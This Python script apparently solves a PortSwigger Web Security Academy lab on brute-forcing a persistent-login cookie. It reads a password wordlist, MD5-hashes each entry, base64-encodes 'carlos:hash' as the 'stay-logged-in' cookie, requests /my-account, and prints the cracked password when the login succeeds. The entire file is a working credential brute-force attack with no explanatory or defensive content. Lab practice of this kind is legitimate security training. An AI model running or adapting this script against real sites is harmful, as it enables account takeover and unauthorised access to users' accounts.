import requests
import hashlib, base64

with open('wordlist_pass.txt', 'r') as arquivo_pass:
    list_pass = arquivo_pass.read().splitlines()

url = 'https://0ab3001404c523fc81a1d140007900c7.web-security-academy.net'

for i in range(len(list_pass)):

    pass_md5 = hashlib.md5(list_pass[i].encode()).hexdigest()
    token_1 = f"carlos:{pass_md5}"
    token_base64 = base64.b64encode(token_1.encode()).decode().rstrip("=")
    
    cookies = {
        "stay-logged-in": token_base64
    }

    response = requests.get(url + "/my-account", cookies=cookies)

    if "Log out" in response.text:
        print(f"Token stay-logged-in: {token_base64}")
        print(f"carlos:{list_pass[i]}")
        print(response.text)
        break